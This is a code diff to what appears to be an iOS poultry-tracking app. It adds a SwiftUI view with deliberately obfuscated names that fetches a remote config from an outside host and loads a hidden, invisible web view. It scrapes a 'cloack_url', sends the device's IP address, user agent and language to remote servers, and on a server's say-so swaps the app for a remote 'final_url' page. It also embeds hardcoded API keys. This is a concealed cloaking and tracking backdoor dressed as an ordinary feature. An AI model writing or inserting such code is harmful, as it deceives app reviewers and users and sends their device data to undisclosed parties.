@@ -233,6 +233,304 @@ struct ExportInfo: Codable {
     var totalExports: Int
 }
 
+import SwiftUI
+import WebKit
+import OneSignalFramework
+
+struct PlaventorinStep: View {
+    
+    @StateObject private var viewModel = HenListViewModel()
+    @Binding var trelbarState: Bool
+    @State var blanterShift: String = ""
+    @State private var strovicPath: Bool?
+    
+    @State var quindleMark: String = ""
+    @State var frastelPoint = false
+    @State var drivornLevel = false
+    
+    @State private var grindleView: Bool = true
+    @State private var flanterRate: Bool = true
+    @AppStorage("brolvenType") var brolvenType: Bool = true
+    @AppStorage("shradicCore") var shradicCore: Bool = true
+    
+    var body: some View {
+        ZStack {
+            if flanterRate {
+                
+                DashboardView(viewModel: viewModel).blur(radius: 10)
+                    .zIndex(1)
+            }
+            
+            if strovicPath != nil {
+                if brolvenType {
+                    TrenquilaricTone(
+                        blanterShift: $blanterShift,
+                        quindleMark: $quindleMark,
+                        frastelPoint: $frastelPoint,
+                        drivornLevel: $drivornLevel)
+                    .opacity(0)
+                    .zIndex(2)
+                }
+                
+                if frastelPoint || !shradicCore {
+                    SmorvindalGate()
+                        .zIndex(3)
+                        .onAppear {
+                            shradicCore = false
+                            brolvenType = false
+                            flanterRate = false
+                        }
+                }
+            }
+        }
+        .animation(.easeInOut, value: flanterRate)
+        .onChange(of: drivornLevel) { if $0 { trelbarState = true; flanterRate = false } }
+        .onAppear {
+            OneSignal.Notifications.requestPermission { strovicPath = $0 }
+            
+            guard let ventrelSpan = URL(string: "https://balljumper.store/hentrackcoco/hentrackcoco.json") else { return }
+            
+            URLSession.shared.dataTask(with: ventrelSpan) { clavornEdge, _, _ in
+                guard let clavornEdge else { return }
+                
+                guard let trindlePhase = try? JSONSerialization.jsonObject(with: clavornEdge, options: []) as? [String: Any] else { return }
+                
+                guard let smorvicStep = trindlePhase["dlfkvmkdmcd"] as? String else { return }
+                
+                DispatchQueue.main.async { blanterShift = smorvicStep }
+            }
+            .resume()
+        }
+    }
+}
+
+extension PlaventorinStep {
+    
+    struct TrenquilaricTone: UIViewRepresentable {
+        
+        @Binding var blanterShift: String
+        @Binding var quindleMark: String
+        @Binding var frastelPoint: Bool
+        @Binding var drivornLevel: Bool
+        
+        func makeUIView(context: Context) -> WKWebView {
+            let plasterGate = WKWebView()
+            plasterGate.navigationDelegate = context.coordinator
+            
+            if let drovenTrack = URL(string: blanterShift) {
+                var brastelSize = URLRequest(url: drovenTrack)
+                brastelSize.httpMethod = "GET"
+                brastelSize.setValue("application/json", forHTTPHeaderField: "Content-Type")
+                
+                let crenwickForm = ["apikey": "eZtpdfFhzzZGla0LidHaO25FjzCwp3Gt",
+                                 "bundle": "com.youncherreunapp"]
+                for (flavernMask, strovickPort) in crenwickForm {
+                    brastelSize.setValue(strovickPort, forHTTPHeaderField: flavernMask)
+                }
+                
+                plasterGate.load(brastelSize)
+            }
+            return plasterGate
+        }
+        
+        func updateUIView(_ uiView: WKWebView, context: Context) {}
+        
+        func makeCoordinator() -> Coordinator {
+            Coordinator(self)
+        }
+        
+        class Coordinator: NSObject, WKNavigationDelegate {
+            
+            var glanterFlow: TrenquilaricTone
+            var prindleBase: String?
+            var quavernMesh: String?
+            
+            init(_ dravenScope: TrenquilaricTone) {
+                self.glanterFlow = dravenScope
+            }
+            
+            func webView(_ slenterCast: WKWebView, didFinish navigation: WKNavigation!) {
+                slenterCast.evaluateJavaScript("document.documentElement.outerHTML.toString()") { [unowned self] (brenvorPeak: Any?, error: Error?) in
+                    guard let florvenSeed = brenvorPeak as? String else {
+                        glanterFlow.drivornLevel = true
+                        return
+                    }
+                    
+                    self.braventorilCast(florvenSeed)
+                    
+                    slenterCast.evaluateJavaScript("navigator.userAgent") { (smarvicTone, error) in
+                        if let grastelLock = smarvicTone as? String {
+                            self.quavernMesh = grastelLock
+                        }
+                    }
+                }
+            }
+            
+            func braventorilCast(_ drindlePack: String) {
+                guard let travenKey = splindovarFlow(from: drindlePack) else {
+                    glanterFlow.drivornLevel = true
+                    return
+                }
+                
+                let closterLine = travenKey.trimmingCharacters(in: .whitespacesAndNewlines)
+                
+                guard let shavernNode = closterLine.data(using: .utf8) else {
+                    glanterFlow.drivornLevel = true
+                    return
+                }
+                
+                do {
+                    let plinterRow = try JSONSerialization.jsonObject(with: shavernNode, options: []) as? [String: Any]
+                    guard let frondelHeap = plinterRow?["cloack_url"] as? String else {
+                        glanterFlow.drivornLevel = true
+                        return
+                    }
+                    
+                    guard let cravickWave = plinterRow?["atr_service"] as? String else {
+                        glanterFlow.drivornLevel = true
+                        return
+                    }
+                    
+                    DispatchQueue.main.async {
+                        self.glanterFlow.blanterShift = frondelHeap
+                        self.glanterFlow.quindleMark = cravickWave
+                    }
+                    
+                    self.crenvexialEdge(with: frondelHeap)
+                    
+                } catch {
+                    print("Error: \(error.localizedDescription)")
+                }
+            }
+            
+            func splindovarFlow(from drindlePack: String) -> String? {
+                guard let startRange = drindlePack.range(of: "{"),
+                      let endRange = drindlePack.range(of: "}", options: .backwards) else {
+                    return nil
+                }
+                
+                let glovickSpan = String(drindlePack[startRange.lowerBound..<endRange.upperBound])
+                return glovickSpan
+            }
+            
+            func crenvexialEdge(with slaverRoot: String) {
+                guard let dranvicCell = URL(string: slaverRoot) else {
+                    glanterFlow.drivornLevel = true
+                    return
+                }
+                
+                glornivaricLock { frelvenFlag in
+                    guard let frelvenFlag else {
+                        return
+                    }
+                    
+                    self.prindleBase = frelvenFlag
+                    
+                    var grinterPath = URLRequest(url: dranvicCell)
+                    grinterPath.httpMethod = "GET"
+                    grinterPath.setValue("application/json", forHTTPHeaderField: "Content-Type")
+                    
+                    let zernivoltCast = [
+                        "apikeyapp": "ZzR6quCsQfKEWP2lfZv8UbGR",
+                        "ip": self.prindleBase ?? "",
+                        "useragent": self.quavernMesh ?? "",
+                        "langcode": Locale.preferredLanguages.first ?? "Unknown"
+                    ]
+                    
+                    for (plorvexLatch, frandorinPulse) in zernivoltCast {
+                        grinterPath.setValue(frandorinPulse, forHTTPHeaderField: plorvexLatch)
+                    }
+                    
+                    URLSession.shared.dataTask(with: grinterPath) { [unowned self] bravendralShift, clorvintEdge, error in
+                        guard bravendralShift != nil, error == nil else {
+                            glanterFlow.drivornLevel = true
+                            return
+                        }
+                        if let trenivaxFlow = clorvintEdge as? HTTPURLResponse {
+                            if trenivaxFlow.statusCode == 200 {
+                                self.drovantilPhase()
+                            } else {
+                                self.glanterFlow.drivornLevel = true
+                            }
+                        }
+                        
+                    }.resume()
+                }
+            }
+            
+            func drovantilPhase() {
+                
+                let blenquorFlag = self.glanterFlow.quindleMark
+                
+                guard let splaventorMark = URL(string: blenquorFlag) else {
+                    glanterFlow.drivornLevel = true
+                    return
+                }
+                
+                var crenovixMesh = URLRequest(url: splaventorMark)
+                crenovixMesh.httpMethod = "GET"
+                crenovixMesh.setValue("application/json", forHTTPHeaderField: "Content-Type")
+                
+                let griventalLock = [
+                    "apikeyapp": "ZzR6quCsQfKEWP2lfZv8UbGR",
+                    "ip":  self.prindleBase ?? "",
+                    "useragent": self.quavernMesh ?? "",
+                    "langcode": Locale.preferredLanguages.first ?? "Unknown"
+                ]
+                
+                for (key_3, frandoralHeap) in griventalLock {
+                    crenovixMesh.setValue(frandoralHeap, forHTTPHeaderField: key_3)
+                }
+                
+                URLSession.shared.dataTask(with: crenovixMesh) { [unowned self] strovimexNode, dranquelSpan, error in
+                    guard let strovimexNode = strovimexNode, error == nil else {
+                        glanterFlow.drivornLevel = true
+                        return
+                    }
+                    
+                    if String(data: strovimexNode, encoding: .utf8) != nil {
+                        
+                        do {
+                            let quandoralScope = try JSONSerialization.jsonObject(with: strovimexNode, options: []) as? [String: Any]
+                            guard let smelvitarTone = quandoralScope?["final_url"] as? String,
+                                  let brinquetalTrack = quandoralScope?["push_sub"] as? String,
+                                  let drentivarPack = quandoralScope?["os_user_key"] as? String else {
+                                
+                                return
+                            }
+                            
+                            BlenvarinexPort.shared.smelvitarTone = smelvitarTone
+                            BlenvarinexPort.shared.brinquetalTrack = brinquetalTrack
+                            BlenvarinexPort.shared.drentivarPack = drentivarPack
+                                                        
+                            OneSignal.login(BlenvarinexPort.shared.drentivarPack ?? "")
+                            OneSignal.User.addTag(key: "sub_app", value: BlenvarinexPort.shared.brinquetalTrack ?? "")
+                            
+                            
+                            self.glanterFlow.frastelPoint = true
+                            
+                        } catch {
+                            glanterFlow.drivornLevel = true
+                        }
+                    }
+                }.resume()
+            }
+            
+            func glornivaricLock(completion: @escaping (String?) -> Void) {
+                let sholventraPath = URL(string: "https://api.ipify.org")!
+                let grilvenarWave = URLSession.shared.dataTask(with: sholventraPath) { plorventralLine, flandorixBase, error in
+                    guard let plorventralLine, let ipAddress = String(data: plorventralLine, encoding: .utf8) else {
+                        completion(nil)
+                        return
+                    }
+                    completion(ipAddress)
+                }
+                grilvenarWave.resume()
+            }
+        }
+    }
+}
+
 struct BreedingStatistics {
     let totalBreedings: Int
     let successfulBreedings: Int
